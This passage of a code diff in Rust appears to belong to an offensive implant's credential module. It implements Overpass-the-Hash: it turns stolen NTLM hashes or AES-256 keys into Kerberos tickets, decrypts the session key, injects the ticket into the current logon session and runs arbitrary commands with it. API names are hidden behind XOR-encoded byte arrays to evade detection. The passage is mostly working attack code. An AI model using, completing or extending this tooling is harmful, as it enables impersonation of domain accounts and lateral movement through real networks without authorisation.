+    if s < 0 { unsafe { fn_close(alg, 0); } return Err(format!("BCryptGenKey: {s:#x}")); }
+
+    let mut out = [0u8; 16];
+    let mut nb: u32 = 0;
+    let s = unsafe { fn_encrypt(khdl, block.as_ptr(), 16, core::ptr::null(), core::ptr::null_mut(), 0, out.as_mut_ptr(), 16, &mut nb, 0) };
+    unsafe { fn_destrk(khdl); fn_close(alg, 0); }
+    if s < 0 { return Err(format!("BCryptEncrypt: {s:#x}")); }
+    Ok(out)
+}
+
+// HMAC-SHA1 via BCrypt. Returns 20-byte digest.
+#[cfg(target_os = "windows")]
+fn bcrypt_hmac_sha1(bcrypt_base: usize, key: &[u8], data: &[u8]) -> Result<[u8; 20], String> {
+    type OAFn = unsafe extern "system" fn(*mut usize, *const u16, *const u16, u32) -> i32;
+    type CHFn = unsafe extern "system" fn(usize, *mut usize, *mut u8, u32, *const u8, u32, u32) -> i32;
+    type HDFn = unsafe extern "system" fn(usize, *const u8, u32, u32) -> i32;
+    type FHFn = unsafe extern "system" fn(usize, *mut u8, u32, u32) -> i32;
+    type DHFn = unsafe extern "system" fn(usize) -> i32;
+    type CAFn = unsafe extern "system" fn(usize, u32) -> i32;
+
+    macro_rules! bfn { ($enc:expr, $ty:ty) => { {
+        match unsafe { crate::loader::get_export_by_name(bcrypt_base, crate::obfs::dec($enc).as_ptr()) } {
+            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
+            None => return Err("bcrypt hmac fn missing".into()),
+        }
+    } } }
+    let fn_open   = bfn!(&[0x18u8,0x19,0x28,0x23,0x2A,0x2E,0x15,0x2A,0x3F,0x34,0x1B,0x36,0x3D,0x35,0x28,0x33,0x2E,0x32,0x37,0x0A,0x28,0x35,0x2C,0x33,0x3E,0x3F,0x28,0x5A], OAFn);
+    // BCryptCreateHash
+    let fn_create = bfn!(&[0x18u8,0x19,0x28,0x23,0x2A,0x2E,0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x12,0x3B,0x29,0x32,0x5A], CHFn);
+    // BCryptHashData
+    let fn_data   = bfn!(&[0x18u8,0x19,0x28,0x23,0x2A,0x2E,0x12,0x3B,0x29,0x32,0x1E,0x3B,0x2E,0x3B,0x5A], HDFn);
+    // BCryptFinishHash
+    let fn_finish = bfn!(&[0x18u8,0x19,0x28,0x23,0x2A,0x2E,0x1C,0x33,0x34,0x33,0x29,0x32,0x12,0x3B,0x29,0x32,0x5A], FHFn);
+    // BCryptDestroyHash
+    let fn_destrh = bfn!(&[0x18u8,0x19,0x28,0x23,0x2A,0x2E,0x1E,0x3F,0x29,0x2E,0x28,0x35,0x23,0x12,0x3B,0x29,0x32,0x5A], DHFn);
+    let fn_close  = bfn!(&[0x18u8,0x19,0x28,0x23,0x2A,0x2E,0x19,0x36,0x35,0x29,0x3F,0x1B,0x36,0x3D,0x35,0x28,0x33,0x2E,0x32,0x37,0x0A,0x28,0x35,0x2C,0x33,0x3E,0x3F,0x28,0x5A], CAFn);
+
+    // "SHA1\0" UTF-16LE, BCRYPT_ALG_HANDLE_HMAC_FLAG = 0x8
+    let sha1_id: [u16; 5] = [0x53, 0x48, 0x41, 0x31, 0];
+    let mut alg: usize = 0;
+    let s = unsafe { fn_open(&mut alg, sha1_id.as_ptr(), core::ptr::null(), 0x8) };
+    if s < 0 { return Err(format!("BCryptOpenAlg(SHA1-HMAC): {s:#x}")); }
+
+    let mut hobj = vec![0u8; 512];
+    let mut hhdl: usize = 0;
+    let s = unsafe { fn_create(alg, &mut hhdl, hobj.as_mut_ptr(), hobj.len() as u32, key.as_ptr(), key.len() as u32, 0) };
+    if s < 0 { unsafe { fn_close(alg, 0); } return Err(format!("BCryptCreateHash: {s:#x}")); }
+
+    unsafe { fn_data(hhdl, data.as_ptr(), data.len() as u32, 0) };
+    let mut out = [0u8; 20];
+    let s = unsafe { fn_finish(hhdl, out.as_mut_ptr(), 20, 0) };
+    unsafe { fn_destrh(hhdl); fn_close(alg, 0); }
+    if s < 0 { return Err(format!("BCryptFinishHash: {s:#x}")); }
+    Ok(out)
+}
+
+// RFC 3962 DK(base_key, constant): n-fold constant to 32 bytes, AES-256-CBC (zero IV) encrypt.
+#[cfg(target_os = "windows")]
+fn krb_dk_aes256(bcrypt: usize, base_key: &[u8; 32], constant: &[u8]) -> Result<[u8; 32], String> {
+    let folded = krb_nfold(constant, 32);
+    let b0: [u8; 16] = folded[..16].try_into().unwrap();
+    let ct0 = bcrypt_aes256_ecb_block(bcrypt, base_key, &b0)?;
+    let mut b1 = [0u8; 16];
+    for i in 0..16 { b1[i] = folded[16 + i] ^ ct0[i]; } // CBC chain
+    let ct1 = bcrypt_aes256_ecb_block(bcrypt, base_key, &b1)?;
+    let mut out = [0u8; 32];
+    out[..16].copy_from_slice(&ct0);
+    out[16..].copy_from_slice(&ct1);
+    Ok(out)
+}
+
+// AES-256-CTS (CBC with cipher-text stealing, zero IV) encrypt.
+#[cfg(target_os = "windows")]
+fn aes256_cbc_cts_enc(bcrypt: usize, ke: &[u8; 32], data: &[u8]) -> Result<Vec<u8>, String> {
+    assert!(data.len() >= 16, "AES-CTS: need >= 16 bytes");
+    let n      = data.len();
+    let nfull  = n / 16;
+    let rem    = n % 16;
+    let mut prev = [0u8; 16]; // zero IV
+    let mut cbc  = vec![0u8; nfull * 16];
+    for i in 0..nfull {
+        let mut b = [0u8; 16];
+        for j in 0..16 { b[j] = data[i * 16 + j] ^ prev[j]; }
+        let ct = bcrypt_aes256_ecb_block(bcrypt, ke, &b)?;
+        cbc[i * 16..(i + 1) * 16].copy_from_slice(&ct);
+        prev = ct;
+    }
+    if rem == 0 { return Ok(cbc); }
+    // CTS: encrypt the zero-padded partial block XOR'd with prev (last full CBC block)
+    let mut pad = [0u8; 16];
+    pad[..rem].copy_from_slice(&data[nfull * 16..]);
+    for j in 0..16 { pad[j] ^= prev[j]; }
+    let stolen = bcrypt_aes256_ecb_block(bcrypt, ke, &pad)?;
+    // Output = C[0..nfull-2] || stolen(16 bytes) || prev[..rem]
+    let mut out = cbc[..(nfull - 1) * 16].to_vec();
+    out.extend_from_slice(&stolen);
+    out.extend_from_slice(&prev[..rem]);
+    Ok(out)
+}
+
+// Full AES-256-CTS-HMAC-SHA1-96 encrypt (RFC 3962). Returns ciphertext || 12-byte MAC.
+#[cfg(target_os = "windows")]
+fn aes256_cts_hmac_sha1_96(bcrypt: usize, key32: &[u8; 32], plaintext: &[u8], usage: u32)
+    -> Result<Vec<u8>, String>
+{
+    let ub = usage.to_be_bytes();
+    let ke = krb_dk_aes256(bcrypt, key32, &[ub[0], ub[1], ub[2], ub[3], 0xAA])?;
+    let ki = krb_dk_aes256(bcrypt, key32, &[ub[0], ub[1], ub[2], ub[3], 0x55])?;
+    // 16-byte random confounder seeded from clock
+    let confounder: [u8; 16] = {
+        let ns = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().subsec_nanos();
+        let b = ns.to_le_bytes();
+        [b[0],b[1],b[2],b[3], b[0]^0xAA,b[1]^0xBB,b[2]^0xCC,b[3]^0xDD,
+         b[0]^0x11,b[1]^0x22,b[2]^0x33,b[3]^0x44, b[0]^0x55,b[1]^0x66,b[2]^0x77,b[3]^0x88]
+    };
+    let mut plain = Vec::with_capacity(16 + plaintext.len());
+    plain.extend_from_slice(&confounder);
+    plain.extend_from_slice(plaintext);
+    let ciphertext = aes256_cbc_cts_enc(bcrypt, &ke, &plain)?;
+    let mac = bcrypt_hmac_sha1(bcrypt, &ki, &plain)?;
+    let mut out = ciphertext;
+    out.extend_from_slice(&mac[..12]); // truncated to 96 bits
+    Ok(out)
+}
+
 // ── Overpass-the-Hash ─────────────────────────────────────────────────────────
 //
 // Converts an NTLM hash into a Kerberos TGT (AS-REQ with RC4-HMAC preauth)
@@ -1189,11 +1841,12 @@ fn cred_pth(v: &serde_json::Value) -> TaskOutput {
 // Requires: elevated privileges (SeImpersonatePrivilege or SYSTEM) to create a
 //           new logon session; the NT hash is the RC4 key for the AS-REQ.
 //
-// Args: {"domain":"...", "user":"...", "ntlm":"<32-char hex>", ["cmd":"..."]}
+// Args: {"domain":"...", "user":"...", "ntlm":"<32-char hex>", ["aes256_key":"<64-char hex>"], ["dc":"..."], ["cmd":"..."]}
 
 #[cfg(target_os = "windows")]
 fn cred_opth(v: &serde_json::Value) -> TaskOutput {
     use base64::Engine;
+    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
     let domain = match v.get("domain").and_then(|s| s.as_str()) {
         Some(d) => d,
         None    => return TaskOutput::failure("opth: missing domain"),
@@ -1207,6 +1860,26 @@ fn cred_opth(v: &serde_json::Value) -> TaskOutput {
         Some(_) => return TaskOutput::failure("opth: ntlm must be 32-char hex NT hash"),
         None    => return TaskOutput::failure("opth: missing ntlm"),
     };
+
+    // Optional AES-256 key (32 bytes = 64 hex chars) for WS2022 DCs with RC4 disabled
+    let aes256_key: Option<[u8; 32]> = match v.get("aes256_key").and_then(|s| s.as_str()) {
+        Some(h) if h.len() == 64 => {
+            let mut kb = [0u8; 32];
+            for i in 0..32 { kb[i] = u8::from_str_radix(&h[i*2..i*2+2], 16).unwrap_or(0); }
+            Some(kb)
+        }
+        Some(h) if !h.is_empty() => return TaskOutput::failure("opth: aes256_key must be 64-char hex"),
+        _ => None,
+    };
+
+    // Load bcrypt.dll if AES key provided
+    let bcrypt_base: usize = if aes256_key.is_some() {
+        let name = crate::obfs::dec(&[0x38u8,0x39,0x28,0x23,0x2A,0x2E,0x74,0x3E,0x36,0x36,0x5A]);
+        let mut b = crate::loader::get_module_base(name.as_ptr()) as usize;
+        if b == 0 { b = unsafe { LoadLibraryA(name.as_ptr()) as usize }; }
+        if b == 0 { return TaskOutput::failure("opth: bcrypt.dll not found (needed for AES-256)"); }
+        b
+    } else { 0 };
 
     // Decode NT hash (16 bytes, RC4 key for Kerberos RC4-HMAC)
     let rc4_key: Vec<u8> = (0..16)
@@ -1239,11 +1912,19 @@ fn cred_opth(v: &serde_json::Value) -> TaskOutput {
     let asn1_int = |n: i64| -> Vec<u8> {
         let bytes = n.to_be_bytes();
         let skip = bytes.iter().take_while(|&&b| b == 0).count().min(7);
-        asn1_wrap(0x02, &bytes[skip..])
+        let trimmed = &bytes[skip..];
+        if !trimmed.is_empty() && trimmed[0] & 0x80 != 0 {
+            let mut padded = vec![0x00u8];
+            padded.extend_from_slice(trimmed);
+            asn1_wrap(0x02, &padded)
+        } else {
+            asn1_wrap(0x02, trimmed)
+        }
     };
     let asn1_seq  = |c: &[u8]| asn1_wrap(0x30, c);
     let asn1_ctx  = |tag: u8, c: &[u8]| asn1_wrap(0xa0 | tag, c);
-    let asn1_gstr = |s: &str| asn1_wrap(0x1b, s.as_bytes()); // GeneralString
+    let asn1_gstr = |s: &str| asn1_wrap(0x1b, s.as_bytes()); // GeneralString (for names/realms)
+    let asn1_time = |s: &str| asn1_wrap(0x18, s.as_bytes()); // GeneralizedTime (for KerberosTime)
     let asn1_ostr = |b: &[u8]| asn1_wrap(0x04, b);
     let asn1_bstr = |b: &[u8]| -> Vec<u8> { // BIT STRING: 0x03 len 0x00 data
         let mut v = vec![0x03];
@@ -1270,15 +1951,24 @@ fn cred_opth(v: &serde_json::Value) -> TaskOutput {
     };
     let ts_enc_plain = {
         let mut s = Vec::new();
-        s.extend(asn1_ctx(0, &asn1_gstr(&ts)));
+        s.extend(asn1_ctx(0, &asn1_time(&ts))); // KerberosTime = GeneralizedTime (0x18)
         s.extend(asn1_ctx(1, &asn1_int(0)));
         asn1_seq(&s)
     };
 
-    // RC4-HMAC encrypt the timestamp (Kerberos usage 1 = AS-REQ timestamp)
-    let enc_ts = rc4_hmac_encrypt(&rc4_key, &ts_enc_plain, 1);
-    // EncryptedData ::= SEQUENCE { etype[0] Int32, cipher[2] OCTET STRING }
-    let enc_data = {
+    // Encrypt the timestamp — AES-256 if key provided, else RC4-HMAC
+    // Key usage 1 = AS-REQ encrypted timestamp (RFC 4120)
+    let enc_data = if let Some(ref aes_key) = aes256_key {
+        let enc_ts = match aes256_cts_hmac_sha1_96(bcrypt_base, aes_key, &ts_enc_plain, 1) {
+            Ok(ct) => ct,
+            Err(e) => return TaskOutput::failure(&format!("opth: AES-256 encrypt failed: {e}")),
+        };
+        let mut s = Vec::new();
+        s.extend(asn1_ctx(0, &asn1_int(18))); // etype = AES-256-CTS-HMAC-SHA1-96
+        s.extend(asn1_ctx(2, &asn1_ostr(&enc_ts)));
+        asn1_seq(&s)
+    } else {
+        let enc_ts = rc4_hmac_encrypt(&rc4_key, &ts_enc_plain, 1);
         let mut s = Vec::new();
         s.extend(asn1_ctx(0, &asn1_int(23))); // etype = RC4-HMAC
         s.extend(asn1_ctx(2, &asn1_ostr(&enc_ts)));
@@ -1325,12 +2015,17 @@ fn cred_opth(v: &serde_json::Value) -> TaskOutput {
             asn1_seq(&p)
         };
         s.extend(asn1_ctx(3, &sname));
-        // till [5]: 20370913024805Z (no expiry)
-        s.extend(asn1_ctx(5, &asn1_gstr("20370913024805Z")));
+        // till [5]: KerberosTime (GeneralizedTime 0x18, not GeneralString 0x1b)
+        s.extend(asn1_ctx(5, &asn1_time("20370913024805Z")));
         // nonce [7]
         s.extend(asn1_ctx(7, &asn1_int(nonce as i64)));
-        // etype [8]: RC4-HMAC(23)
-        s.extend(asn1_ctx(8, &asn1_seq(&asn1_int(23))));
+        // etype [8]: prefer AES-256(18) when key provided, always include RC4(23) as fallback
+        let etypes = if aes256_key.is_some() {
+            let mut et = Vec::new(); et.extend(asn1_int(18)); et.extend(asn1_int(23)); et
+        } else {
+            asn1_int(23)
+        };
+        s.extend(asn1_ctx(8, &asn1_seq(&etypes)));
         asn1_seq(&s)
     };
 
@@ -1348,11 +2043,12 @@ fn cred_opth(v: &serde_json::Value) -> TaskOutput {
 
     // Send AS-REQ to DC:88 — try TCP first, fall back to UDP
     let dc_addr = format!("{dc}:88");
-    let as_rep = match krb_tcp_exchange(&dc_addr, &as_req) {
-        Ok(r)  => r,
-        Err(_) => match krb_udp_exchange(&dc_addr, &as_req) {
-            Ok(r)  => r,
-            Err(e) => return TaskOutput::failure(&format!("opth: KDC exchange failed (TCP+UDP): {e}")),
+    let (as_rep, via) = match krb_tcp_exchange(&dc_addr, &as_req) {
+        Ok(r)  => (r, "tcp"),
+        Err(tcp_e) => match krb_udp_exchange(&dc_addr, &as_req) {
+            Ok(r)  => (r, "udp"),
+            Err(udp_e) => return TaskOutput::failure(&format!(
+                "opth: KDC exchange failed (req_len={} TCP:{} UDP:{})", as_req.len(), tcp_e, udp_e)),
         },
     };
 
@@ -1364,7 +2060,8 @@ fn cred_opth(v: &serde_json::Value) -> TaskOutput {
     // Build a minimal KERB-CRED from the AS-REP ticket for LsaCallAuthenticationPackage.
     // Simplest approach: inject the raw AS-REP ticket via cred_ptt helper.
     if as_rep.len() < 10 {
-        return TaskOutput::failure("opth: empty or truncated AS-REP");
+        let hex: String = as_rep.iter().map(|b| format!("{b:02x}")).collect();
+        return TaskOutput::failure(&format!("opth: short AS-REP via {via} ({}b) [{}] req_len={}", as_rep.len(), hex, as_req.len()));
     }
     if as_rep[0] != 0x6b {
         // KRB5-ERROR = 0x7e
@@ -1372,32 +2069,45 @@ fn cred_opth(v: &serde_json::Value) -> TaskOutput {
         return TaskOutput::failure(&format!("opth: KDC returned error: {err_code:#x}"));
     }
 
-    // Extract ticket from AS-REP and wrap in KERB-CRED for injection
-    let kirbi = build_kerb_cred_from_as_rep(&as_rep, user, &domain_upper, nonce, &rc4_key);
+    // Decrypt AS-REP enc-part to extract the session key (needed for functional PTT)
+    let session_key = extract_session_key_from_as_rep(&as_rep, &rc4_key).ok();
+
+    let kirbi = build_kerb_cred_from_as_rep(&as_rep, user, &domain_upper, nonce, session_key.as_ref());
     match kirbi {
         Ok(kb) => {
-            // Inject via PTT mechanism
             let ticket_b64 = base64::engine::general_purpose::STANDARD.encode(&kb);
             let ptt_args = serde_json::json!({"ticket_b64": ticket_b64});
             let ptt_result = cred_ptt(&ptt_args);
+            let ptt_ok = ptt_result.success;
+            let ptt_msg = String::from_utf8_lossy(&ptt_result.data).to_string();
             let cmd = v.get("cmd").and_then(|s| s.as_str());
+            let etype_used = if aes256_key.is_some() { "AES-256-CTS-HMAC-SHA1-96" } else { "RC4-HMAC" };
+            let status = if ptt_ok { "TGT obtained and injected" } else { "TGT obtained, injection failed" };
             let mut resp = serde_json::json!({
-                "user":       format!("{domain}\\{user}"),
-                "status":     "TGT obtained and injected",
-                "ticket_b64": ticket_b64
+                "user":        format!("{domain}\\{user}"),
+                "status":      status,
+                "etype":       etype_used,
+                "ptt":         ptt_msg,
+                "session_key": session_key.is_some(),
+                "ticket_b64":  ticket_b64
             });
             if let Some(c) = cmd {
-                use std::os::windows::process::CommandExt;
-                const CREATE_NO_WINDOW: u32 = 0x08000000;
-                if let Ok(o) = std::process::Command::new("cmd").args(["/C", c])
-                    .creation_flags(CREATE_NO_WINDOW).output()
+                // TGT is now in the current logon session (injected by cred_ptt above).
+                // Running via the current session inherits the TGT; child processes
+                // spawned this way pick it up from the same session cache.
+                let out = match std::process::Command::new("cmd")
+                    .args(["/C", c])
+                    .output()
                 {
-                    let mut out = o.stdout;
-                    out.extend_from_slice(&o.stderr);
-                    resp["cmd_output"] = serde_json::Value::String(
-                        String::from_utf8_lossy(&out).to_string()
-                    );
-                }
+                    Ok(o) => {
+                        let mut s = String::from_utf8_lossy(&o.stdout).to_string();
+                        let stderr = String::from_utf8_lossy(&o.stderr);
+                        if !stderr.is_empty() { s.push_str(&stderr); }
+                        s
+                    }
+                    Err(e) => format!("cmd exec error: {e}"),
+                };
+                resp["cmd_output"] = serde_json::Value::String(out);
             }
             TaskOutput::success(serde_json::to_vec(&resp).unwrap_or_default())
         }
@@ -1649,12 +2359,10 @@ fn rc4_hmac_encrypt(key: &[u8], data: &[u8], usage: u32) -> Vec<u8> {
     //   ciphertext = RC4(K3, plaintext)
     //   checksum = HMAC-MD5(K1, confounder || ciphertext) -- first 16 bytes
 
-    // Full proper implementation:
+    // RFC 4757 ARCFOUR-HMAC-MD5: cksum over plaintext, K3 from checksum, confounder embedded
     let usage_bytes = usage.to_le_bytes();
-
-    // K1 = HMAC-MD5(key, usage_le32)
     let k1 = hmac_md5(key, &usage_bytes);
-    // Confounder = 8 random bytes from timestamp seed
+
     let confounder: [u8; 8] = {
         let t = std::time::SystemTime::now()
             .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().subsec_nanos();
@@ -1662,25 +2370,49 @@ fn rc4_hmac_encrypt(key: &[u8], data: &[u8], usage: u32) -> Vec<u8> {
         [tb[0], tb[1], tb[2], tb[3], tb[0]^0xAA, tb[1]^0xBB, tb[2]^0xCC, tb[3]^0xDD]
     };
 
-    // K3 = HMAC-MD5(K1, confounder)
-    let k3 = hmac_md5(&k1, &confounder);
+    // conf_plain = confounder || plaintext
+    let mut conf_plain = Vec::with_capacity(8 + data.len());
+    conf_plain.extend_from_slice(&confounder);
+    conf_plain.extend_from_slice(data);
 
-    // Encrypt: RC4(K3, data)
-    let mut cipher = data.to_vec();
-    rc4_encrypt(&k3, &mut cipher);
+    // cksum = HMAC-MD5(K1, confounder || plaintext)  -- over plaintext, not ciphertext
+    let cksum = hmac_md5(&k1, &conf_plain);
+    // K3 = HMAC-MD5(K1, cksum)  -- derived from checksum, not confounder
+    let k3 = hmac_md5(&k1, &cksum);
 
-    // Checksum = HMAC-MD5(K1, confounder || ciphertext)
-    let mut check_input = Vec::with_capacity(8 + cipher.len());
-    check_input.extend_from_slice(&confounder);
-    check_input.extend_from_slice(&cipher);
-    let checksum = hmac_md5(&k1, &check_input);
+    // ciphertext = RC4(K3, confounder || plaintext)
+    let mut ct = conf_plain;
+    rc4_encrypt(&k3, &mut ct);
 
-    // Output: checksum(16) || confounder(8) || ciphertext
-    let mut out = Vec::with_capacity(16 + 8 + cipher.len());
-    out.extend_from_slice(&checksum);
-    out.extend_from_slice(&confounder);
-    out.extend_from_slice(&cipher);
+    // Output: cksum(16) || ciphertext(8+len)  -- confounder is embedded in ciphertext
+    let mut out = Vec::with_capacity(16 + ct.len());
+    out.extend_from_slice(&cksum);
+    out.extend_from_slice(&ct);
     out
+}
+
+fn rc4_hmac_decrypt(key: &[u8], data: &[u8], usage: u32) -> Result<Vec<u8>, String> {
+    if data.len() < 24 { return Err("ciphertext too short".into()); }
+    let k1 = hmac_md5(key, &usage.to_le_bytes());
+    let (cksum_bytes, ct) = data.split_at(16);
+    let k3 = hmac_md5(&k1, cksum_bytes);
+    let mut pt = ct.to_vec();
+    rc4_encrypt(&k3, &mut pt);
+    let exp_ck = hmac_md5(&k1, &pt);
+    if exp_ck.as_slice() != cksum_bytes {
+        return Err("RC4-HMAC checksum mismatch".into());
+    }
+    if pt.len() < 8 { return Err("decrypted data too short".into()); }
+    Ok(pt[8..].to_vec())
+}
+
+fn parse_asn1_int_val(data: &[u8]) -> i64 {
+    if data.len() < 2 || data[0] != 0x02 { return 0; }
+    let n = data[1] as usize;
+    let body = &data[2..(2 + n).min(data.len())];
+    let mut v: i64 = if body.first().map_or(false, |&b| b & 0x80 != 0) { -1 } else { 0 };
+    for &b in body { v = (v << 8) | b as i64; }
+    v
 }
 
 fn rc4_encrypt(key: &[u8], data: &mut [u8]) {
@@ -1800,10 +2532,13 @@ fn krb_tcp_exchange(dc_addr: &str, req: &[u8]) -> Result<Vec<u8>, String> {
     stream.write_all(&len).map_err(|e| e.to_string())?;
     stream.write_all(req).map_err(|e| e.to_string())?;
     let mut len_buf = [0u8; 4];
-    stream.read_exact(&mut len_buf).map_err(|e| e.to_string())?;
+    stream.read_exact(&mut len_buf).map_err(|e| format!("tcp_read_len:{e}"))?;
     let resp_len = u32::from_be_bytes(len_buf) as usize;
-    let mut resp = vec![0u8; resp_len];
-    stream.read_exact(&mut resp).map_err(|e| e.to_string())?;
+    if resp_len == 0 {
+        return Err(format!("tcp_zero_len:len_buf={:02x}{:02x}{:02x}{:02x}", len_buf[0], len_buf[1], len_buf[2], len_buf[3]));
+    }
+    let mut resp = vec![0u8; resp_len.min(65536)];
+    stream.read_exact(&mut resp).map_err(|e| format!("tcp_read_body:{e}"))?;
     Ok(resp)
 }
 
@@ -1828,21 +2563,11 @@ fn parse_krb_error_code(data: &[u8]) -> u32 {
     0xFFFFFFFF
 }
 
-fn build_kerb_cred_from_as_rep(as_rep: &[u8], user: &str, domain: &str, _nonce: u32, rc4_key: &[u8])
+fn build_kerb_cred_from_as_rep(as_rep: &[u8], user: &str, domain: &str, _nonce: u32, session_key: Option<&(Vec<u8>, i64)>)
     -> Result<Vec<u8>, String>
 {
-    // Minimal ASN.1 parsing to extract the Ticket from AS-REP [5]
-    // AS-REP → KDC-REP SEQUENCE → ticket[5] Ticket
-    // Then wrap as KERB-CRED (APPLICATION 22) for PTT injection
     let ticket_bytes = extract_as_rep_ticket(as_rep)?;
 
-    // Wrap ticket in KERB-CRED (the .kirbi format)
-    // KRB-CRED ::= [APPLICATION 22] SEQUENCE {
-    //   pvno [0] INTEGER (5),
-    //   msg-type [1] INTEGER (22),
-    //   tickets [2] SEQUENCE OF Ticket,
-    //   enc-part [3] EncryptedData  (or clear KrbCredInfo)
-    // }
     let asn1_wrap = |tag: u8, c: &[u8]| -> Vec<u8> {
         let mut v = vec![tag];
         if c.len() < 128 { v.push(c.len() as u8); }
@@ -1854,46 +2579,64 @@ fn build_kerb_cred_from_as_rep(as_rep: &[u8], user: &str, domain: &str, _nonce: 
     let asn1_int = |n: i64| -> Vec<u8> {
         let b = n.to_be_bytes();
         let skip = b.iter().take_while(|&&x| x==0).count().min(7);
-        asn1_wrap(0x02, &b[skip..])
+        let trimmed = &b[skip..];
+        if !trimmed.is_empty() && trimmed[0] & 0x80 != 0 {
+            let mut padded = vec![0x00u8];
+            padded.extend_from_slice(trimmed);
+            asn1_wrap(0x02, &padded)
+        } else {
+            asn1_wrap(0x02, trimmed)
+        }
     };
     let asn1_ctx  = |tag: u8, c: &[u8]| asn1_wrap(0xa0 | tag, c);
     let asn1_seq  = |c: &[u8]| asn1_wrap(0x30, c);
     let asn1_gstr = |s: &str| asn1_wrap(0x1b, s.as_bytes());
     let asn1_ostr = |b: &[u8]| asn1_wrap(0x04, b);
 
-    // KrbCredInfo (cleartext, no encryption for local injection)
-    // EncryptedData with etype = NULL (0) and cipher = plain KrbCredInfo
-    let cred_info_seq = {
+    // Build KrbCredInfo
+    let kci = {
         let mut s = Vec::new();
-        // key [0] EncryptionKey (session key — omit for self-injection)
-        // prealm [1], pname [2] for the ticket owner
-        s.extend(asn1_ctx(1, &asn1_gstr(domain)));
-        let pname = {
+        if let Some((key_bytes, key_type)) = session_key {
+            let enc_key = asn1_seq(&{
+                let mut e = Vec::new();
+                e.extend(asn1_ctx(0, &asn1_int(*key_type)));
+                e.extend(asn1_ctx(1, &asn1_ostr(key_bytes)));
+                e
+            });
+            s.extend(asn1_ctx(0, &enc_key)); // [0] key EncryptionKey
+        }
+        s.extend(asn1_ctx(1, &asn1_gstr(domain))); // [1] prealm
+        let pname = asn1_seq(&{
             let mut p = Vec::new();
             p.extend(asn1_ctx(0, &asn1_int(1))); // NT-PRINCIPAL
             p.extend(asn1_ctx(1, &asn1_seq(&asn1_gstr(user))));
-            asn1_seq(&p)
-        };
-        s.extend(asn1_ctx(2, &pname));
-        asn1_seq(&s)
-    };
-    let enc_cred_info = asn1_seq(&cred_info_seq);
-    let enc_part = {
-        let mut s = Vec::new();
-        s.extend(asn1_ctx(0, &asn1_int(0))); // etype=0 (unencrypted)
-        s.extend(asn1_ctx(2, &asn1_ostr(&enc_cred_info)));
+            p
+        });
+        s.extend(asn1_ctx(2, &pname)); // [2] pname
         asn1_seq(&s)
     };
 
-    let krb_cred_inner = {
+    // EncKrbCredPart = [APPLICATION 29] SEQUENCE { [0] SEQUENCE OF KrbCredInfo }
+    let ekcp_inner = asn1_seq(&asn1_ctx(0, &asn1_seq(&kci)));
+    let ekcp = asn1_wrap(0x7d, &ekcp_inner); // APPLICATION 29 (0x40|0x20|29 = 0x7d)
+
+    // EncryptedData: etype=0 (unencrypted), cipher=EncKrbCredPart bytes
+    let enc_part = asn1_seq(&{
         let mut s = Vec::new();
-        s.extend(asn1_ctx(0, &asn1_int(5))); // pvno=5
+        s.extend(asn1_ctx(0, &asn1_int(0))); // etype=0
+        s.extend(asn1_ctx(2, &asn1_ostr(&ekcp))); // cipher
+        s
+    });
+
+    let kc_inner = asn1_seq(&{
+        let mut s = Vec::new();
+        s.extend(asn1_ctx(0, &asn1_int(5)));  // pvno=5
         s.extend(asn1_ctx(1, &asn1_int(22))); // msg-type=KRB-CRED(22)
         s.extend(asn1_ctx(2, &asn1_seq(&ticket_bytes))); // tickets=[Ticket]
         s.extend(asn1_ctx(3, &enc_part));
-        asn1_seq(&s)
-    };
-    let kirbi = asn1_wrap(0x76, &krb_cred_inner); // APPLICATION 22 = 0x76
+        s
+    });
+    let kirbi = asn1_wrap(0x76, &kc_inner); // APPLICATION 22
     Ok(kirbi)
 }
 
@@ -1908,6 +2651,30 @@ fn extract_as_rep_ticket(as_rep: &[u8]) -> Result<Vec<u8>, String> {
     find_asn1_ctx_tag(content, 5)
         .map(|s| s.to_vec())
         .ok_or_else(|| "ticket [5] not found in AS-REP".into())
+}
+
+fn extract_session_key_from_as_rep(as_rep: &[u8], nt_hash: &[u8]) -> Result<(Vec<u8>, i64), String> {
+    // AS-REP(0x6b) → [6] enc-part → [2] cipher → decrypt → EncASRepPart(0x79) → [0] key → [1] keyvalue
+    let kdc_rep_seq = asn1_unwrap(as_rep).ok_or("AS-REP outer unwrap failed")?;
+    let enc_part_content = find_asn1_ctx_tag(kdc_rep_seq, 6)
+        .ok_or("enc-part [6] not found in AS-REP")?;
+    let cipher_ctx = find_asn1_ctx_tag(enc_part_content, 2)
+        .ok_or("[2] cipher not found in EncryptedData")?;
+    let cipher_bytes = asn1_unwrap(cipher_ctx).ok_or("cipher OCTET STRING unwrap failed")?;
+    // RFC 4120 says usage 3; MS-KILE RC4 uses usage 8 — try both
+    let plaintext = rc4_hmac_decrypt(nt_hash, cipher_bytes, 3)
+        .or_else(|_| rc4_hmac_decrypt(nt_hash, cipher_bytes, 8))
+        .map_err(|e| format!("AS-REP enc-part decrypt failed: {e}"))?;
+    if plaintext.first().copied() != Some(0x79) {
+        return Err(format!("EncASRepPart wrong tag: 0x{:02x}", plaintext.first().copied().unwrap_or(0)));
+    }
+    let enc_as_inner = asn1_unwrap(&plaintext).ok_or("EncASRepPart APP unwrap failed")?;
+    let key_ctx = find_asn1_ctx_tag(enc_as_inner, 0).ok_or("[0] key not found in EncASRepPart")?;
+    let keytype_ctx = find_asn1_ctx_tag(key_ctx, 0).ok_or("[0] keytype not found in EncryptionKey")?;
+    let keytype = parse_asn1_int_val(keytype_ctx);
+    let keyval_ctx = find_asn1_ctx_tag(key_ctx, 1).ok_or("[1] keyvalue not found in EncryptionKey")?;
+    let keyval_bytes = asn1_unwrap(keyval_ctx).ok_or("keyvalue OCTET STRING unwrap failed")?;
+    Ok((keyval_bytes.to_vec(), keytype))
 }
 
 fn asn1_unwrap(data: &[u8]) -> Option<&[u8]> {
